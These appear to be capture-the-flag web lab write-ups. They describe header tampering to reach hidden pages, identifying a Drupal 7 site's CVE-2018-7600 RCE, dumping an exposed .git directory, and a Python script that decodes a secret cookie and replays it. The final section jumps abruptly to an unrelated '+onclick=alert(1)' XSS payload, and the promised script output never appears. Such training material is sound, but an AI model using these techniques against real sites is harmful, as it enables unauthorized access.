#### **description**

Creative Thinking will make getting the flag so much easier

#### **Solution**

well, let's to search about anything so i use my name 'mounir'

![image](https://github.com/user-attachments/assets/50ca8bf5-495c-4b21-acc0-831ad54ae8f2)


here we go u see this result 

![image](https://github.com/user-attachments/assets/a59f7d17-cb6d-4407-840f-b3a136cbceb6)


now let's review page's source code 

![image](https://github.com/user-attachments/assets/e7f50b1a-4f64-4fe2-802c-85f0f141878a)

 
 okay i think this is good findings soo let's try to search about 'Momen' 

![image](https://github.com/user-attachments/assets/689f8764-8543-4e54-8fe7-e89046a6ec10)


well found endpoint called 'hint.php' let's what is this 

![image](https://github.com/user-attachments/assets/e2156273-0722-416c-9362-f72f7d92a12d)


after moment show this i think we now have param called show and it's have two value true or false let's and see what is happen 

![image](https://github.com/user-attachments/assets/fd64c32a-80d7-4fac-a63f-fec08467476b)


and we found this first i'll explain this code and search for exploit to bypass every function

![image](https://github.com/user-attachments/assets/220b8217-9857-443c-a855-afca8e3fe05c)


Going on, at the begining of the source code, there is a commented line , “`// Our Site Have robots.txt Too`”. I decide to visit the page robots.txt and this is what I get.

![image](https://github.com/user-attachments/assets/a84c529f-362a-4db2-8a29-39af79bb1f24)


Unfortunately, visiting the pages **_/flag.php_**, **_/flag1.jpg_**, and **_/robots.txt.php_** shows nothing. Further analysis of the source code in /hint.php, I get a hint on how to bypass the error message that is shown by visiting the page /robots.txt.php . :

“`/*   To Get The Final Flag Try To Search About The Right User-Agent And File ;)   Remember: - The Flag Not Always Exits In What We See   */`”

so, now let's set HTTP_REFERER's value to `http://cyberguy` and see what happen (u can intercept request in burp and update referer header's value or use any browser extension or use curl it's up to u   in my case i'll use browser extension )

![image](https://github.com/user-attachments/assets/d38e732a-9286-4857-b192-e701e1edd4ad)


and don't forget to set cookies 

![image](https://github.com/user-attachments/assets/57312580-d432-4258-a9f6-f78817cdd21f)


and try to access to robots.txt.php

![image](https://github.com/user-attachments/assets/fb3d18d0-9118-4337-85da-3cbe609fb08a)

it's doesn't work so after some research i try to modify the referer header from` “http://cyberguy,to “(lab-url/robots.txt.php)”`, and the method from **GET** to PUT

![image](https://github.com/user-attachments/assets/6decc1c5-c249-4290-b52f-03f313f39101)


and see we now have value to user-agent header so let's update this value and try to access on /user_check.php

![image](https://github.com/user-attachments/assets/a93de560-2628-42ec-a45a-3a473abd73a1)

#### **description**

What’s CVE ID could be used against the web application in the below target

Note: its an unauthenticated RCE vulnerability.

Flag format CVE-xxxx-xxxx

#### **Solution**

in this lab we'll focus in  description well, after read we now search for CVE so let's review source 
but after this we saw in footer "Powered by Drupal"

![image](https://github.com/user-attachments/assets/3b2f8af1-4112-4635-a31d-1a24e8f9bd85)


so what's Drupal ??

- **Drupal** is a free, open-source CMS written in PHP.
    
- It’s used to build and manage websites — from personal blogs to government portals and enterprise platforms.
    
- Known for its flexibility, scalability, and strong security.
    
- Offers thousands of **modules** (plugins) and **themes** to extend functionality and design.

so we now search about cve on Drupal but first we must know what is the version of Drupal let's review source code 

![image](https://github.com/user-attachments/assets/41cea55c-11b6-452b-94bc-e45bf7822a8d)


focus on line 16 in meta tags we now know the version is 7 well , the is solve it just search for cve in Mitre (if u don't found it u can look on this link --> [CVE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2018-7600) )

#### **description**

Can you catch toka

#### **Solution**

after access the lab and review source code i found nothing so i try to in intercept requests with burp to see them and i found nothing so after some search plus see lab's  Description
i then realized the solution is related to change Languages so after see request headers i found "Accept-Language" header so i try to change it to German (it just change the to de and u can see others value in this [site](https://www.iana.org/assignments/language-subtag-registry/language-subtag-registry) ) and for more info about "Accept-Language"  u can see this [blog](https://mike-diaz006.medium.com/what-i-learned-at-work-this-week-accept-language-http-header-f0574d242cc8) soo after modified it and send request u got the flag in the body of the response 

from

#### **description**

Can you beat sonic?

#### **Solution**

after access the lab u see Apache web server page so i review source code and i found no thing so after see Robots.txt file i found hint tell me to use git soo i realized we'll use [GitTools](https://github.com/internetwache/GitTools) so i used dumber to see git status and what's happen (i mean commits) well , after use dumber i restore file named "index.php" (with this command "`git restore index.php`")
and after see it i make script to get the flag but first I'll explain the code 

![image](https://github.com/user-attachments/assets/242c16d0-5b84-4c84-af81-cff1dc052f6e)


then type "git status " 

![image](https://github.com/user-attachments/assets/19a42628-e5b7-4f8e-83b7-25aca3840874)


now type " git restore index.php" to restore this file 

![image](https://github.com/user-attachments/assets/fb58789c-58b4-4840-a0f3-be6488c0fb03)


and this is the index.php file 

```php
<!DOCTYPE html>

<?php
Session_start();

function mstime(){

  return round(microtime(true) * 1000);
}

function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

if(!isset($_SESSION['flooog']) and !isset($_COOKIE['secret'])) {
    $flog=generateRandomString();
    $_SESSION['flooog'] = $flog;
    $_SESSION['counter'] = mstime();
    setcookie("secret",base64_encode($flog));



}

if (isset($_POST['Q'])) {
  if ($_POST['Q']== $_SESSION['flooog']) {

    if (  (mstime() - $_SESSION['counter']) < 2999  ){

    echo '<span filter-content="S">You won against sonic!!! GJ Here is a flag for you: flag{f4k3_fl4g}</span>';

    }else{

 echo '<span filter-content="S">cmon.. do you call this speed?</span>';

    }

  }else{

 echo '<span filter-content="S">The encoded secret you provided is wrong :( Sonic is not impressed</span>';

    echo "\n";
  }

}else{

 echo "\n";
 echo '<span filter-content="S">Q parameter is not set!</span>';
  echo '<span filter-content="S">Challenge suspended</span>';
}
?>
<!-- partial -->
  <script src='https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.12/vue.min.js'></script>
</body>
</html>
```


Let's go step by step to explain the code we found in index.php file, and then I'll also explain the script I created in detail.

 **Explanation of the PHP code**:

 HTML Part:

This part defines a simple HTML structure with an SVG graphic for a blur effect (it’s part of the page's design, not directly related to the challenge).

```html
<svg xmlns="http://www.w3.org/2000/svg">
    <filter id="motion-blur-filter" filterUnits="userSpaceOnUse">
        <feGaussianBlur stdDeviation="100 0"></feGaussianBlur>
    </filter>
</svg>
```

- This SVG defines a **motion blur effect** using the `feGaussianBlur` filter. It’s just part of the page's visual style.


---

 PHP Part:

Let’s dive into the PHP part where the logic for the challenge is implemented:

1. **Session Initialization**:

```php
Session_start();
```

- This starts a PHP session to store and retrieve session variables like `$_SESSION['flooog']` and `$_SESSION['counter']`.
    

2. **Helper Functions**:

```php
function mstime() {
    return round(microtime(true) * 1000);
}
```

- `mstime()` returns the current time in milliseconds by using `microtime(true)` and multiplying it by 1000.

```php
function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
```

- `generateRandomString()` generates a random string of a given length (default length is 10). It uses a set of characters (digits, lowercase, and uppercase) to form the random string.

---

3. **Session and Cookie Handling**:
    

```php
if (!isset($_SESSION['flooog']) and !isset($_COOKIE['secret'])) {
    $flog = generateRandomString();
    $_SESSION['flooog'] = $flog;
    $_SESSION['counter'] = mstime();
    setcookie("secret", base64_encode($flog));
}
```

- If the session variable `$_SESSION['flooog']` or the cookie `$_COOKIE['secret']` do not exist:
    
    - It generates a random string (`$flog`) and stores it in the session (`$_SESSION['flooog']`).
        
    - It also records the current timestamp (`$_SESSION['counter']`) in milliseconds.
        
    - It sets a cookie (`secret`) with the base64-encoded value of `$flog`.
        

This means the session is now initialized, and the secret (`flooog`) is saved both in the session and in the cookie.

---

4. **Processing the User's Input**:

```php
if (isset($_POST['Q'])) {
    if ($_POST['Q'] == $_SESSION['flooog']) {
        if ((mstime() - $_SESSION['counter']) < 2999) {
            echo '<span filter-content="S">You won against sonic!!! GJ Here is a flag for you: flag{f4k3_fl4g}</span>';
        } else {
            echo '<span filter-content="S">cmon.. do you call this speed?</span>';
        }
    } else {
        echo '<span filter-content="S">The encoded secret you provided is wrong :( Sonic is not impressed</span>';
    }
} else {
    echo '<span filter-content="S">Q parameter is not set!</span>';
    echo '<span filter-content="S">Challenge suspended</span>';
}
```

- **If the `Q` parameter is set** in a POST request:
    
    - The script checks if the value of `Q` matches `$_SESSION['flooog']`.
        
    - If it matches:
        
        - It checks if the time difference between the current time and the session's timestamp is **less than 3 seconds** (3000 ms).
            
        - If the time condition is met, it prints a success message with a flag (`flag{f4k3_fl4g}`).
            
        - If the time condition is not met, it prints a message saying the speed is too slow.
            
    - If the `Q` value doesn’t match the session's `flooog`, it prints an error message.
        
- **If the `Q` parameter is not set** in the POST request, it prints that the challenge is suspended and the `Q` parameter is missing.

---

 **Explaining the Python Script**:

Now, let’s break down the Python script I wrote to exploit the challenge:

1. **Create a Session**:

```python
s = requests.Session()
```

- This initializes a session object using the `requests` library. This object will keep track of cookies (such as the `PHPSESSID` cookie), so you can reuse them for multiple requests.

2. **Send a GET Request to Capture Cookies**:

```python
r = s.get(url)
```

- A GET request is sent to the target URL to start a session and receive cookies from the server. The `secret` cookie (which contains the base64-encoded `flooog` value) will be set by the server during this initial request.

3. **Extract the Secret Cookie**:

```python
secret_cookie = r.cookies['secret']
```

- We extract the `secret` cookie from the response. This cookie holds the base64-encoded session value (`flooog`).

4. **Decode the Cookie**:

```python
decoded_cookie = urllib.parse.unquote(secret_cookie)
flooog = base64.b64decode(decoded_cookie).decode()
```

- The `secret_cookie` is URL-encoded, so we use `urllib.parse.unquote()` to decode it first.

- Then, we decode the base64-encoded value using `base64.b64decode()` to retrieve the actual `flooog` value (the secret).

5. **Make a POST Request with the Correct `Q` Parameter**:

```python
data = {'Q': flooog}
r2 = s.post(url, data=data)
```

- Now that we have the correct `flooog` value, we send it as the `Q` parameter in a POST request to the server. This will allow us to interact with the server and check if the flag is returned.

6. **Check the Response**:

```python
print("[+] Response Status Code:", r2.status_code)
print("[+] Response Text:\n", r2.text)
```

- The response from the server is checked, and the status code and text are printed. If everything works correctly, the response will contain the flag.

And after u run  script i already explain it in above 

```python 
import requests

import base64

import urllib.parse 
  

url = "http://ur-lab-link/index.php" # use must edit this value to ue lab's link
  

s = requests.Session()

  

r = s.get(url)

  

if "secret" not in r.cookies:

    print("[-] Failed to get secret cookie!")

    exit()

  

secret_cookie = r.cookies["secret"]

print("[+] Got secret cookie (raw):", secret_cookie)

  

# Step 2: URL decode first

decoded_cookie = urllib.parse.unquote(secret_cookie)

print("[+] URL-decoded cookie:", decoded_cookie)

  

# Step 3: Base64 decode

flooog = base64.b64decode(decoded_cookie).decode()

print("[+] Decoded flooog value:", flooog)

  

# Step 4: POST with Q

data = {"Q": flooog}

r2 = s.post(url, data=data)

  

print("[+] Response Status Code:", r2.status_code)

print("[+] Response Text:\n", r2.text)
```

Well, after u run the script u got output like this and  it's contain the flag :

well, i now realized we try to input payload (i already try it lol)  i mean what about put it after regular photo link and i submitted and got the flag payload i used --> +onclick=alert(1) because the link reflect in a tags and + this is space (url-encoded) so it must be look like this 

```html
 <a href=somethign_here onclick=alert(1) rest_of_the_tag >
```
